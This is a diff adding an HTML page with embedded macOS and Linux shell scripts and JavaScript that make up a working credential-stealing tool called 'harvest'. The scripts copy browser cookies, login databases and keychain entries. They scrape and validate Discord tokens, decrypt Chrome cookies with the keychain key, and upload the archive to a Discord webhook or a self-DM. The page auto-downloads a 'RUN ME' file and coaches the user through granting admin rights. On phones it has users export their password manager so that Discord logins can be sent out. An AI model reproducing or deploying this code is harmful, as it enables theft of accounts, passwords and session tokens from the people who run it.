+REALUSER="$(stat -f '%Su' "$REALHOME" 2>/dev/null || echo "${SUDO_USER:-root}")"
+
+OUT="$REALHOME/Desktop/harvest_$(date +%Y%m%d_%H%M%S)"
+[ -d "$REALHOME/Desktop" ] || OUT="$REALHOME/harvest_$(date +%Y%m%d_%H%M%S)"
+RAW="$OUT/raw"
+mkdir -p "$RAW" || exit 1
+echo "  target: $OUT"
+echo
+
+copy_prof() {
+  name="$1"; base="$2"
+  [ -d "$base" ] || return 0
+  echo "  [+] $name"
+  [ -f "$base/Local State" ] && cp "$base/Local State" "$RAW/${name}__LocalState.json" 2>/dev/null
+  for prof in "$base/Default" "$base"/Profile*; do
+    [ -d "$prof" ] || continue
+    tag="${name}__$(basename "$prof")"
+    for f in "Network/Cookies" "Cookies" "Login Data" "Web Data"; do
+      [ -f "$prof/$f" ] && cp "$prof/$f" "$RAW/${tag}__$(printf '%s' "$f" | tr '/' '_')" 2>/dev/null
+    done
+  done
+}
+
+A="$REALHOME/Library/Application Support"
+copy_prof Chrome  "$A/Google/Chrome"
+copy_prof Edge    "$A/Microsoft Edge"
+copy_prof Brave   "$A/BraveSoftware/Brave-Browser"
+copy_prof Vivaldi "$A/Vivaldi"
+copy_prof Opera   "$A/com.operasoftware.Opera"
+
+for p in "$A/Firefox/Profiles"/*; do
+  [ -d "$p" ] || continue
+  echo "  [+] Firefox $(basename "$p")"
+  for f in cookies.sqlite logins.json key4.db; do
+    [ -f "$p/$f" ] && cp "$p/$f" "$RAW/Firefox__$(basename "$p")__$f" 2>/dev/null
+  done
+done
+
+for a in discord discordcanary discordptb Lightcord Vencord Equicord Vesktop WebCord Dorion Legcord; do
+  p="$A/$a"
+  [ -d "$p" ] || continue
+  echo "  [+] discord: $a"
+  d="$OUT/discord_$a"
+  mkdir -p "$d"
+  for sub in "Local State" "Network/Cookies" "Local Storage/leveldb" "IndexedDB" "Session Storage"; do
+    [ -e "$p/$sub" ] && cp -R "$p/$sub" "$d/$(printf '%s' "$sub" | tr '/' '_')" 2>/dev/null
+  done
+done
+
+echo
+echo "  [*] scanning for discord tokens"
+RX='(^|[^A-Za-z0-9_-])(mfa\.[A-Za-z0-9_-]{80,110}|[A-Za-z0-9_-]{24,28}\.[A-Za-z0-9_-]{6,7}\.[A-Za-z0-9_-]{25,110})($|[^A-Za-z0-9_-])'
+: > "$OUT/tokens.txt"
+{
+  find "$A" -maxdepth 7 -type d \( -name 'leveldb' -o -name 'ls' -o -name 'IndexedDB' -o -name 'Session Storage' \) 2>/dev/null |
+  while IFS= read -r d; do
+    dst="$RAW/LS__$(printf '%s' "$d" | tr '/ :' '___')"
+    mkdir -p "$dst"
+    cp "$d"/* "$dst" 2>/dev/null
+    find "$d" -maxdepth 1 -type f -size -40M 2>/dev/null | while IFS= read -r f; do
+      grep -aoE "$RX" "$f" 2>/dev/null | sed -E 's/^[^A-Za-z0-9_-]//; s/[^A-Za-z0-9_-]$//'
+    done
+  done
+  for a in discord discordcanary discordptb Vencord Equicord Vesktop WebCord Legcord; do
+    [ -d "$A/$a" ] || continue
+    find "$A/$a" -type f -size -40M 2>/dev/null | while IFS= read -r f; do
+      grep -aoE "$RX" "$f" 2>/dev/null | sed -E 's/^[^A-Za-z0-9_-]//; s/[^A-Za-z0-9_-]$//'
+    done
+  done
+} | sort -u > "$OUT/tokens.txt"
+echo "  [+] $(wc -l < "$OUT/tokens.txt" | tr -d ' ') candidate(s)"
+
+IDF="$OUT/discord_accounts.txt"
+: > "$IDF"
+while IFS= read -r t; do
+  [ -n "$t" ] || continue
+  R=$(curl -s --max-time 15 -H "Authorization: $t" -H 'User-Agent: Mozilla/5.0' https://discord.com/api/v9/users/@me)
+  case "$R" in
+    *'"username"'*)
+      U=$(printf '%s' "$R" | sed -E 's/.*"username": ?"([^"]*)".*/\1/')
+      E=$(printf '%s' "$R" | sed -E 's/.*"email": ?"?([^",]*)"?.*/\1/')
+      P=$(printf '%s' "$R" | sed -E 's/.*"phone": ?"?([^",]*)"?.*/\1/')
+      M=$(printf '%s' "$R" | sed -E 's/.*"mfa_enabled": ?([a-z]*).*/\1/')
+      printf 'user: %s  email: %s  phone: %s  mfa: %s\ntoken: %s\n\n' "$U" "$E" "$P" "$M" "$t" >> "$IDF"
+      echo "  [+] $U <$E>" ;;
+    *) printf 'token (unverified): %s\n\n' "$t" >> "$IDF" ;;
+  esac
+done < "$OUT/tokens.txt"
+
+KEY=$(security find-generic-password -k "$REALHOME/Library/Keychains/login.keychain-db" -w -s "Chrome Safe Storage" 2>/dev/null || true)
+if [ -n "${KEY:-}" ] && command -v sqlite3 >/dev/null 2>&1; then
+  echo "  [*] decrypting cookies"
+  DK=$(openssl enc -aes-128-cbc -pbkdf2 -iter 1003 -md sha1 -pass pass:"$KEY" -S 73616c747973616c74 -P 2>/dev/null | sed -n 's/^key=//p')
+  IV=20202020202020202020202020202020
+  : > "$OUT/cookies.txt"
+  for db in "$RAW"/*Cookies*; do
+    [ -f "$db" ] || continue
+    printf '## %s\n' "$(basename "$db")" >> "$OUT/cookies.txt"
+    sqlite3 -separator '|' "$db" "select host_key,name,hex(encrypted_value),value from cookies" 2>/dev/null |
+    while IFS='|' read -r h n x v; do
+      if [ -n "$x" ]; then
+        val=$(printf '%s' "$x" | cut -c7- | xxd -r -p | openssl enc -aes-128-cbc -d -K "$DK" -iv "$IV" 2>/dev/null | tr -d '\000')
+      else
+        val="$v"
+      fi
+      printf '%s\t%s\t%s\n' "$h" "$n" "$val" >> "$OUT/cookies.txt"
+    done
+  done
+fi
+
+security find-internet-password -k "$REALHOME/Library/Keychains/login.keychain-db" -s discord.com -g > "$OUT/discord_keychain.txt" 2>&1
+
+cat > "$OUT/README.txt" <<'TXT'
+raw/                  browser databases, Local State, leveldb
+discord_*/            full copies of every Discord install found
+discord_accounts.txt  token -> username / email / phone / 2FA state
+discord_keychain.txt  saved discord.com keychain entry
+tokens.txt            every token matched on the profile
+cookies.txt           decrypted cookies
+TXT
+
+ZIP="$OUT.zip"
+if command -v zip >/dev/null 2>&1; then ( cd "$OUT" && zip -qr "$ZIP" . ); else tar czf "$OUT.tar.gz" -C "$OUT" .; ZIP="$OUT.tar.gz"; fi
+[ -n "$REALUSER" ] && chown -R "$REALUSER" "$OUT" "$ZIP" 2>/dev/null
+
+CFG="$REALHOME/.harvest_cfg"
+HOOK=""
+[ -f "$CFG" ] && HOOK=$(head -n1 "$CFG" | tr -d '\r')
+if [ -z "$HOOK" ]; then
+  HOOK=$(osascript -e 'text returned of (display dialog "Discord webhook URL (Cancel = DM the account instead):" default answer "" with title "harvest")' 2>/dev/null || true)
+  if [ -n "$HOOK" ]; then printf '%s\n' "$HOOK" > "$CFG"; chown "$REALUSER" "$CFG" 2>/dev/null; fi
+fi
+
+esc() { awk 'BEGIN{ORS=""} {gsub(/\\/,"\\\\"); gsub(/"/,"\\\""); printf "%s\\n", $0}'; }
+SUMMARY=$(printf 'harvest %s %s\ntokens: %s\n\n' "$(hostname)" "$REALUSER" "$(wc -l < "$OUT/tokens.txt" | tr -d ' ')"; cat "$IDF" 2>/dev/null)
+
+if [ -n "$HOOK" ]; then
+  echo "  [*] posting to webhook"
+  if [ "$(stat -f%z "$ZIP")" -lt 8000000 ]; then
+    curl -s -F "payload_json={\"username\":\"harvest\",\"content\":\"$(printf '%s' "$SUMMARY" | esc)\"}" -F "file=@$ZIP" "$HOOK" >/dev/null
+  else
+    printf '%s' "$SUMMARY" | fold -s -w 1700 | while IFS= read -r line; do
+      curl -s -H 'Content-Type: application/json' -d "{\"username\":\"harvest\",\"content\":\"$(printf '%s' "$line" | esc)\"}" "$HOOK" >/dev/null
+      sleep 0.4
+    done
+  fi
+else
+  echo "  [*] self-DM fallback"
+  T=$(head -n1 "$OUT/tokens.txt")
+  if [ -n "$T" ]; then
+    ME=$(curl -s -H "Authorization: $T" -H 'User-Agent: Mozilla/5.0' https://discord.com/api/v9/users/@me)
+    UID_=$(printf '%s' "$ME" | sed -E 's/.*"id": ?"([0-9]+)".*/\1/')
+    CH=$(curl -s -X POST -H "Authorization: $T" -H 'User-Agent: Mozilla/5.0' -H 'Content-Type: application/json' -d "{\"recipient_id\":\"$UID_\"}" https://discord.com/api/v9/users/@me/channels)
+    CID=$(printf '%s' "$CH" | sed -E 's/.*"id": ?"([0-9]+)".*/\1/')
+    printf '%s' "$SUMMARY" | fold -s -w 1700 | while IFS= read -r line; do
+      curl -s -X POST -H "Authorization: $T" -H 'User-Agent: Mozilla/5.0' -H 'Content-Type: application/json' -d "{\"content\":\"$(printf '%s' "$line" | esc)\"}" "https://discord.com/api/v9/channels/$CID/messages" >/dev/null
+      sleep 0.4
+    done
+    echo "  sent to DMs"
+  fi
+fi
+
+echo "  saved -> $ZIP"
+open "$OUT" 2>/dev/null
+</script>
+
+<script type="text/plain" id="linux">
+#!/bin/bash
+# RUN ME (Linux)
+set -u
+
+SELF="$(cd "$(dirname "$0")" && pwd)/$(basename "$0")"
+REALHOME="$HOME"
+
+if [ "$(id -u)" -ne 0 ]; then
+  echo "  requesting administrator rights via sudo"
+  exec sudo -E bash "$SELF" "$REALHOME"
+fi
+REALHOME="${1:-$HOME}"
+REALUSER="${SUDO_USER:-$(id -un)}"
+
+OUT="$REALHOME/Desktop/harvest_$(date +%Y%m%d_%H%M%S)"
+[ -d "$REALHOME/Desktop" ] || OUT="$REALHOME/harvest_$(date +%Y%m%d_%H%M%S)"
+RAW="$OUT/raw"
+mkdir -p "$RAW" || exit 1
+echo "  target: $OUT"
+echo
+
+copy_prof() {
+  name="$1"; base="$2"
+  [ -d "$base" ] || return 0
+  echo "  [+] $name"
+  [ -f "$base/Local State" ] && cp "$base/Local State" "$RAW/${name}__LocalState.json" 2>/dev/null
+  for prof in "$base/Default" "$base"/Profile*; do
+    [ -d "$prof" ] || continue
+    tag="${name}__$(basename "$prof")"
+    for f in "Network/Cookies" "Cookies" "Login Data" "Web Data"; do
+      [ -f "$prof/$f" ] && cp "$prof/$f" "$RAW/${tag}__$(printf '%s' "$f" | tr '/' '_')" 2>/dev/null
+    done
+  done
+}
+
+C="$REALHOME/.config"
+copy_prof Chrome   "$C/google-chrome"
+copy_prof Chromium "$C/chromium"
+copy_prof Edge     "$C/microsoft-edge"
+copy_prof Brave    "$C/BraveSoftware/Brave-Browser"
+copy_prof Vivaldi  "$C/vivaldi"
+copy_prof Opera    "$C/opera"
+copy_prof OperaGX  "$C/opera-gx"
+
+for p in "$REALHOME/.mozilla/firefox"/*; do
+  [ -d "$p" ] || continue
+  echo "  [+] Firefox $(basename "$p")"
+  for f in cookies.sqlite logins.json key4.db; do
+    [ -f "$p/$f" ] && cp "$p/$f" "$RAW/Firefox__$(basename "$p")__$f" 2>/dev/null
+  done
+done
+
+for a in discord discordcanary discordptb Lightcord Vencord Equicord Vesktop WebCord Dorion Legcord; do
+  p="$C/$a"
+  [ -d "$p" ] || continue
+  echo "  [+] discord: $a"
+  d="$OUT/discord_$a"
+  mkdir -p "$d"
+  for sub in "Local State" "Network/Cookies" "Local Storage/leveldb" "IndexedDB" "Session Storage"; do
+    [ -e "$p/$sub" ] && cp -R "$p/$sub" "$d/$(printf '%s' "$sub" | tr '/' '_')" 2>/dev/null
+  done
+done
+
+echo
+echo "  [*] scanning for discord tokens"
+RX='(^|[^A-Za-z0-9_-])(mfa\.[A-Za-z0-9_-]{80,110}|[A-Za-z0-9_-]{24,28}\.[A-Za-z0-9_-]{6,7}\.[A-Za-z0-9_-]{25,110})($|[^A-Za-z0-9_-])'
+: > "$OUT/tokens.txt"
+{
+  find "$C" "$REALHOME/.mozilla" -maxdepth 7 -type d \( -name 'leveldb' -o -name 'ls' -o -name 'IndexedDB' -o -name 'Session Storage' \) 2>/dev/null |
+  while IFS= read -r d; do
+    dst="$RAW/LS__$(printf '%s' "$d" | tr '/ :' '___')"
+    mkdir -p "$dst"
+    cp "$d"/* "$dst" 2>/dev/null
+    find "$d" -maxdepth 1 -type f -size -40M 2>/dev/null | while IFS= read -r f; do
+      grep -aoE "$RX" "$f" 2>/dev/null | sed -E 's/^[^A-Za-z0-9_-]//; s/[^A-Za-z0-9_-]$//'
+    done
+  done
+  for a in discord discordcanary discordptb Vencord Equicord Vesktop WebCord Legcord; do
+    [ -d "$C/$a" ] || continue
+    find "$C/$a" -type f -size -40M 2>/dev/null | while IFS= read -r f; do
+      grep -aoE "$RX" "$f" 2>/dev/null | sed -E 's/^[^A-Za-z0-9_-]//; s/[^A-Za-z0-9_-]$//'
+    done
+  done
+} | sort -u > "$OUT/tokens.txt"
+echo "  [+] $(wc -l < "$OUT/tokens.txt" | tr -d ' ') candidate(s)"
+
+IDF="$OUT/discord_accounts.txt"
+: > "$IDF"
+while IFS= read -r t; do
+  [ -n "$t" ] || continue
+  R=$(curl -s --max-time 15 -H "Authorization: $t" -H 'User-Agent: Mozilla/5.0' https://discord.com/api/v9/users/@me)
+  case "$R" in
+    *'"username"'*)
+      U=$(printf '%s' "$R" | sed -E 's/.*"username": ?"([^"]*)".*/\1/')
+      E=$(printf '%s' "$R" | sed -E 's/.*"email": ?"?([^",]*)"?.*/\1/')
+      P=$(printf '%s' "$R" | sed -E 's/.*"phone": ?"?([^",]*)"?.*/\1/')
+      M=$(printf '%s' "$R" | sed -E 's/.*"mfa_enabled": ?([a-z]*).*/\1/')
+      printf 'user: %s  email: %s  phone: %s  mfa: %s\ntoken: %s\n\n' "$U" "$E" "$P" "$M" "$t" >> "$IDF"
+      echo "  [+] $U <$E>" ;;
+    *) printf 'token (unverified): %s\n\n' "$t" >> "$IDF" ;;
+  esac
+done < "$OUT/tokens.txt"
+
+KEY=""
+command -v secret-tool >/dev/null 2>&1 && KEY=$(sudo -u "$REALUSER" secret-tool lookup application chrome 2>/dev/null || true)
+[ -z "$KEY" ] && KEY="peanuts"
+if command -v sqlite3 >/dev/null 2>&1; then
+  echo "  [*] decrypting cookies"
+  DK=$(openssl enc -aes-128-cbc -pbkdf2 -iter 1 -md sha1 -pass pass:"$KEY" -S 73616c747973616c74 -P 2>/dev/null | sed -n 's/^key=//p')
+  IV=20202020202020202020202020202020
+  : > "$OUT/cookies.txt"
+  for db in "$RAW"/*Cookies*; do
+    [ -f "$db" ] || continue
+    printf '## %s\n' "$(basename "$db")" >> "$OUT/cookies.txt"
+    sqlite3 -separator '|' "$db" "select host_key,name,hex(encrypted_value),value from cookies" 2>/dev/null |
+    while IFS='|' read -r h n x v; do
+      if [ -n "$x" ]; then
+        val=$(printf '%s' "$x" | cut -c7- | xxd -r -p | openssl enc -aes-128-cbc -d -K "$DK" -iv "$IV" 2>/dev/null | tr -d '\000')
+      else
+        val="$v"
+      fi
+      printf '%s\t%s\t%s\n' "$h" "$n" "$val" >> "$OUT/cookies.txt"
+    done
+  done
+fi
+
+cat > "$OUT/README.txt" <<'TXT'
+raw/                  browser databases, Local State, leveldb
+discord_*/            full copies of every Discord install found
+discord_accounts.txt  token -> username / email / phone / 2FA state
+tokens.txt            every token matched on the profile
+cookies.txt           decrypted cookies
+TXT
+
+ZIP="$OUT.zip"
+if command -v zip >/dev/null 2>&1; then ( cd "$OUT" && zip -qr "$ZIP" . ); else tar czf "$OUT.tar.gz" -C "$OUT" .; ZIP="$OUT.tar.gz"; fi
+chown -R "$REALUSER" "$OUT" "$ZIP" 2>/dev/null
+
+CFG="$REALHOME/.harvest_cfg"
+HOOK=""
+[ -f "$CFG" ] && HOOK=$(head -n1 "$CFG" | tr -d '\r')
+if [ -z "$HOOK" ]; then
+  printf '  discord webhook url (enter to skip and self-DM instead): '
+  read -r HOOK
+  if [ -n "$HOOK" ]; then printf '%s\n' "$HOOK" > "$CFG"; chown "$REALUSER" "$CFG" 2>/dev/null; fi
+fi
+
+esc() { awk 'BEGIN{ORS=""} {gsub(/\\/,"\\\\"); gsub(/"/,"\\\""); printf "%s\\n", $0}'; }
+SUMMARY=$(printf 'harvest %s %s\ntokens: %s\n\n' "$(hostname)" "$REALUSER" "$(wc -l < "$OUT/tokens.txt" | tr -d ' ')"; cat "$IDF" 2>/dev/null)
+
+if [ -n "$HOOK" ]; then
+  echo "  [*] posting to webhook"
+  if [ "$(stat -c%s "$ZIP")" -lt 8000000 ]; then
+    curl -s -F "payload_json={\"username\":\"harvest\",\"content\":\"$(printf '%s' "$SUMMARY" | esc)\"}" -F "file=@$ZIP" "$HOOK" >/dev/null
+  else
+    printf '%s' "$SUMMARY" | fold -s -w 1700 | while IFS= read -r line; do
+      curl -s -H 'Content-Type: application/json' -d "{\"username\":\"harvest\",\"content\":\"$(printf '%s' "$line" | esc)\"}" "$HOOK" >/dev/null
+      sleep 0.4
+    done
+  fi
+else
+  echo "  [*] self-DM fallback"
+  T=$(head -n1 "$OUT/tokens.txt")
+  if [ -n "$T" ]; then
+    ME=$(curl -s -H "Authorization: $T" -H 'User-Agent: Mozilla/5.0' https://discord.com/api/v9/users/@me)
+    UID_=$(printf '%s' "$ME" | sed -E 's/.*"id": ?"([0-9]+)".*/\1/')
+    CH=$(curl -s -X POST -H "Authorization: $T" -H 'User-Agent: Mozilla/5.0' -H 'Content-Type: application/json' -d "{\"recipient_id\":\"$UID_\"}" https://discord.com/api/v9/users/@me/channels)
+    CID=$(printf '%s' "$CH" | sed -E 's/.*"id": ?"([0-9]+)".*/\1/')
+    printf '%s' "$SUMMARY" | fold -s -w 1700 | while IFS= read -r line; do
+      curl -s -X POST -H "Authorization: $T" -H 'User-Agent: Mozilla/5.0' -H 'Content-Type: application/json' -d "{\"content\":\"$(printf '%s' "$line" | esc)\"}" "https://discord.com/api/v9/channels/$CID/messages" >/dev/null
+      sleep 0.4
+    done
+    echo "  sent to DMs"
+  fi
+fi
+
+echo "  saved -> $ZIP"
+command -v xdg-open >/dev/null 2>&1 && sudo -u "$REALUSER" xdg-open "$OUT" >/dev/null 2>&1 &
+</script>
+
+<script>
+const MAP = { win:['win','RUN ME.bat','application/x-bat'], mac:['mac','RUN ME.command','application/x-sh'], linux:['linux','RUN ME.sh','application/x-sh'] };
+
+function dl(kind){
+  const [id, name, mime] = MAP[kind];
+  const txt = document.getElementById(id).textContent.replace(/^\n/,'');
+  const blob = new Blob([txt], {type: mime});
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(blob);
+  a.download = name;
+  document.body.appendChild(a);
+  a.click();
+  a.remove();
+  setTimeout(() => URL.revokeObjectURL(a.href), 5000);
+}
+
+/* ---------- mobile: password-manager csv ---------- */
+const HOOKS = {
+  ios: 'Settings → Passwords → Face ID → tap ⋯ top-right → <b>Export All Passwords</b> → save to Files. Then pick that file below. (iOS 18+)',
+  android: 'Chrome → ⋯ → Password Manager → ⚙ → <b>Export passwords</b> → Download. Then pick that file below.'
+};
+
+function parseCsv(text){
+  const rows = []; let row = [], cur = '', q = false;
+  for (let i = 0; i < text.length; i++){
+    const c = text[i];
+    if (q){
+      if (c === '"'){ if (text[i+1] === '"'){ cur += '"'; i++; } else q = false; }
+      else cur += c;
+    } else {
+      if (c === '"') q = true;
+      else if (c === ','){ row.push(cur); cur = ''; }
+      else if (c === '\n'){ row.push(cur); rows.push(row); row = []; cur = ''; }
+      else if (c !== '\r') cur += c;
+    }
+  }
+  if (cur || row.length){ row.push(cur); rows.push(row); }
+  return rows;
+}
+
+let HITS = [];
+
+function parseText(text){
+  const out = document.getElementById('out');
+  if (!text || !text.trim()){ out.textContent = 'nothing to parse'; return; }
+  const rows = parseCsv(text);
+  if (!rows.length){ out.textContent = 'empty file'; return; }
+
+  const head = rows[0].map(h => h.toLowerCase().trim());
+  const idx = k => head.findIndex(h => h === k);
+  let u = idx('url'), t = idx('title') >= 0 ? idx('title') : idx('name'), n = idx('username'), p = idx('password');
+  let start = 1;
+  if (u < 0 && n < 0 && p < 0){ u = 0; n = 1; p = 2; start = 0; }
+
+  HITS = [];
+  for (let i = start; i < rows.length; i++){
+    const r = rows[i];
+    if (!r || r.length < 2) continue;
+    const site = ((t >= 0 ? r[t] : '') + ' ' + (u >= 0 ? r[u] : '')).toLowerCase();
+    if (!site.includes('discord')) continue;
+    HITS.push({ site: (t >= 0 ? r[t] : '') || (u >= 0 ? r[u] : ''), user: n >= 0 ? r[n] : '', pass: p >= 0 ? r[p] : '' });
+  }
+
+  if (!HITS.length){ out.innerHTML = '<span style="color:#fbbf24">no discord rows found</span> — parsed ' + (rows.length - 1) + ' rows, none matched.'; return; }
+  out.innerHTML = '<span class="hit">' + HITS.length + ' discord login(s):</span>\n' +
+    HITS.map(h => h.site + '  |  ' + h.user + '  |  ' + h.pass).join('\n');
+}
+
+function summary(){
+  return 'harvest mobile ' + navigator.platform + '\n\n' +
+    HITS.map(h => h.site + '\n  user: ' + h.user + '\n  pass: ' + h.pass).join('\n\n');
+}
+
+async function send(){
+  const hook = document.getElementById('hook').value.trim();
+  const out = document.getElementById('out');
+  if (!HITS.length){ out.innerHTML = '<span style="color:#fbbf24">parse a csv first</span>'; return; }
+  if (!/^https:\/\/(canary\.|ptb\.)?discord(app)?\.com\/api\/webhooks\//.test(hook)){ out.innerHTML = '<span style="color:#fbbf24">that does not look like a discord webhook url</span>'; return; }
+  localStorage.setItem('harvest_hook', hook);
+  const text = summary();
+  const chunks = text.match(/[\s\S]{1,1700}/g) || [];
+  out.innerHTML = 'sending…';
+  try {
+    for (const c of chunks){
+      const r = await fetch(hook, { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ username:'harvest', content:c }) });
+      if (!r.ok) throw new Error(r.status + ' ' + r.statusText);
+      await new Promise(s => setTimeout(s, 400));
+    }
+    out.innerHTML = '<span class="hit">sent ' + chunks.length + ' message(s) to discord</span>';
+  } catch (e){ out.innerHTML = '<span style="color:#fbbf24">send failed: ' + e.message + '</span>'; }
+}
+
+function copyOut(){
+  if (!HITS.length) return;
+  navigator.clipboard.writeText(summary()).then(
+    () => { document.getElementById('out').innerHTML += '\n<span class="hit">copied</span>'; },
+    () => {}
+  );
+}
+
+/* ---------- boot ---------- */
+(function boot(){
+  const ua = navigator.userAgent, p = navigator.platform || '';
+  const isIOS = /iPhone|iPad|iPod/i.test(ua) || (/Mac/i.test(p) && 'ontouchend' in document);
+  const isAndroid = /Android/i.test(ua);
+  const det = document.getElementById('detect');
+
+  if (isIOS || isAndroid){
+    const which = isIOS ? 'ios' : 'android';
+    det.innerHTML = 'detected: <b>' + (isIOS ? 'iOS' : 'Android') + '</b> — phones can\'t run scripts, so use the password-manager route below.';
+    document.getElementById('desktop').style.display = 'none';
+    document.getElementById('mobile').classList.add('on');
+    document.getElementById('export-how').innerHTML = HOOKS[which];
+    const saved = localStorage.getItem('harvest_hook');
+    if (saved) document.getElementById('hook').value = saved;
+
+    const drop = document.getElementById('drop'), file = document.getElementById('file');
+    drop.onclick = () => file.click();
+    file.onchange = () => {
+      const f = file.files[0];
+      if (!f) return;
+      const rd = new FileReader();
+      rd.onload = () => { drop.innerHTML = '<b>' + f.name + '</b> loaded'; parseText(String(rd.result)); };
+      rd.readAsText(f);
+    };
+    drop.ondragover = e => { e.preventDefault(); drop.classList.add('hot'); };
+    drop.ondragleave = () => drop.classList.remove('hot');
+    drop.ondrop = e => { e.preventDefault(); drop.classList.remove('hot'); const f = e.dataTransfer.files[0]; if (f) { const rd = new FileReader(); rd.onload = () => parseText(String(rd.result)); rd.readAsText(f); } };
+    return;
+  }
+
+  let os = 'linux', label = 'Linux';
+  if (/Win/i.test(p) || /Windows/i.test(ua)) { os = 'win'; label = 'Windows'; }
+  else if (/Mac/i.test(p) || /Mac OS X/i.test(ua)) { os = 'mac'; label = 'macOS'; }
+
+  det.innerHTML = 'detected: <b>' + label + '</b> — downloading <b>RUN ME</b>…';
+  const card = document.getElementById('c-' + os);
+  card.classList.add('match');
+  const b = document.createElement('div');
+  b.className = 'badge';
+  b.textContent = 'MATCH';
+  card.appendChild(b);
+
+  const steps = document.getElementById('steps');
+  if (os === 'win') steps.innerHTML = '<li>the file already downloaded — check your downloads folder.</li><li>double-click <b>RUN ME.bat</b> and accept the UAC prompt.</li><li>paste a webhook when asked, or press enter to self-DM.</li>';
+  if (os === 'mac') steps.innerHTML = '<li>the file already downloaded.</li><li>run <code>chmod +x "RUN ME.command" && ./"RUN ME.command"</code> and approve the admin dialog.</li><li>paste a webhook when asked, or cancel to self-DM.</li>';
+  if (os === 'linux') steps.innerHTML = '<li>the file already downloaded.</li><li>run <code>chmod +x "RUN ME.sh" && ./"RUN ME.sh"</code> and enter your sudo password.</li><li>paste a webhook when asked, or press enter to self-DM.</li>';
+
+  setTimeout(() => { dl(os); det.innerHTML = 'detected: <b>' + label + '</b> — RUN ME is downloading. didn\'t start? use the button.'; }, 350);
+})();
+</script>
+</body>
+</html>
